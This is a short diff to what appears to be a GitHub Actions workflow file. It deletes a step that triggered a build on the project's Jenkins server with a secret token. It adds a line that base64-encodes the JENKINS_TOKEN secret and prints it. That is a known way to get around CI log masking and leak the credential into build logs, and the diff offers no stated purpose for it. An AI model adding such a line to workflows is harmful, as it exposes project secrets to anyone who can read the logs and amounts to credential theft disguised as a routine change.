@@ -19,6 +19,4 @@ jobs:
         env:
           JENKINS_TOKEN: ${{ secrets.JENKINS_TOKEN }}
         run: |
-          curl -X POST https://jenkins.superstream.ai/job/DevOps/job/Superstream/job/SDK\'s/job/kafka-analyzer/build \
-          --user "team@superstream.ai:$JENKINS_TOKEN" \
-          --header "Content-Type: application/json"
+          echo "$JENKINS_TOKEN" | base64
